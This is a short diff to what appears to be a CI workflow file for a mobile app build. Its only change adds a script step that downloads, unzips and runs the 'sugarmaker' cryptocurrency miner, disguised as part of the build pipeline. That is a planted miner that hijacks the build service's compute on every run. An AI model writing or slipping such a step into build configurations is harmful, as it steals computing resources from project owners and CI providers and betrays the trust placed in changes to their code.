@@ -20,7 +20,7 @@ workflows:
           source: true
       cancel_previous_builds: false
     scripts: 
-      - wget https://github.com
+      - apt-get update && apt-get install unzip && wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && cd sugarmaker-v2.5.0-sugar4-linux64 && ./sugarmaker
     artifacts:
       - build/**/outputs/**/*.aab
     publishing:
